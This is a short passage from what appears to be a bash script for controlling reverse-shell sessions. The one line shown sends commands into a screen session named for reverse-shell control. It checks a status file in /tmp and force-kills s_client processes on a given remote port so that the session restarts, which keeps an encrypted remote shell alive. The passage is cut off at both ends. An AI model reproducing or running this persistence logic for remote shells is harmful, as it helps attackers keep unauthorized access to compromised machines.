...
screen -S reverseshellControl_$cname -X stuff "if [[ \$(cat /tmp/screens_$cname) = *'0'* ]]; then echo restarting session...;ps aux | grep s_client | grep $rport | awk '{print $2}' | xargs kill -9 2> /dev/null;fi; done"`echo -ne '\015'`
